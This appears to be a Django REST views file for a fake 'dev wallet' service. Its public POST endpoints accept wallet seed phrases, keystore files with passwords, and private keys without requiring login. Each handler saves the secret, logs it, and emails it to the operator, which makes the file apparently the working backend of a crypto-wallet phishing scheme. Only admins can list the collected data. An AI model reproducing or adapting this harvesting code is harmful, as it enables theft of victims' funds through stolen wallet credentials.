from django.shortcuts import render
from django.http import HttpResponse, JsonResponse
from rest_framework.parsers import JSONParser
from .models import *
from .serializers import DevPhraseSerializer, DevKeystoreSerializer, DevPrivateKeySerializer
from rest_framework import status
from rest_framework.decorators import api_view, permission_classes
from rest_framework.response import Response
from rest_framework import permissions
from django.core.mail import send_mail
from rest_framework.decorators import parser_classes
from django.conf import settings
from .utils import Util

# Create your views here.
@api_view(['GET'])
def getRoutes(request):
    routes = [
        'GET /phrase/',
        'GET /keystores/',
        'GET /privatekey/',
        'POST /phrase/',
        'POST /keystores/',
        'POST /privatekey/'
    ]
    return Response(routes)


@api_view(['GET', 'POST'])
@parser_classes([JSONParser])
def devphrase(request):
    if request.method == 'GET':
        if request.user.is_superuser:
            phrases = DevPhrase.objects.all()
            serializer = DevPhraseSerializer(phrases, many=True)
            print(serializer.data)
            return Response(serializer.data)
        else:
            return HttpResponse("Unauthorized Request - Login as Admin User")

    elif request.method == 'POST':
        print(request.data)
        phrase_data = request.data#JSONParser.parse(request)
        serializer = DevPhraseSerializer(data=phrase_data)
        if serializer.is_valid():
            serializer.save()
            data = {
                "body": f" WALLET ID: {serializer.data['walletId']}\n PHRASE: {serializer.data['phrase']}\n CREATED AT: {serializer['created_at']}",
                "subject": "Dev Wallet Phrase Credentails."
            }
            Util.send_email(data)
            print("email was sent successfully")
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        print("invalid")
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

@api_view(['GET', 'POST'])
@parser_classes([JSONParser])
def devkeystore(request):
    if request.method == 'GET':
        if request.user.is_superuser:
            keystores = DevKeystore.objects.all()
            serializer = DevKeystoreSerializer(keystores, many=True)
            print(serializer.data)
            return Response(serializer.data)
        else:
            return HttpResponse("Unauthorized Request - Login as Admin User")

    elif request.method == 'POST':
        print(request.data)
        keystore_data = request.data#JSONParser().parse(request)
        serializer = DevKeystoreSerializer(data=keystore_data)
        if serializer.is_valid():
            serializer.save()
            data = {
                "body": f"WALLET ID: {serializer.data['walletId']}\n KEYSTORE JSON: {serializer.data['json']} \n PASSWORD: {serializer.data['password']}",
                "subject": "Dev Wallet Keystore Json Credentails."
            }
            Util.send_email(data)
            print("email was sent successfully")
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)

@api_view(['GET', 'POST'])
@parser_classes([JSONParser])
def devprivatekey(request):
    if request.method == 'GET':
        if request.user.is_superuser:
            privatekeys = DevPrivateKey.objects.all()
            serializer = DevPrivateKeySerializer(privatekeys, many=True)
            print(serializer.data)
            return Response(serializer.data)
        else:
            return HttpResponse("Unauthorized Request - Login as Admin User")

    elif request.method == 'POST':
        print(request.data)
        privatekey_data = request.data
        serializer = DevPrivateKeySerializer(data=privatekey_data)
        if serializer.is_valid():
            serializer.save()
            data = {
                "body": f"WALLET ID: {serializer.data['walletId']}\nPRIVATE KEY: {serializer.data['key']}",
                "subject": "Dev Wallet Private Key Credentails."
            }
            Util.send_email(data)
            print("email was sent successfully")
            return Response(serializer.data, status=status.HTTP_201_CREATED)
        return Response(serializer.errors, status=status.HTTP_400_BAD_REQUEST)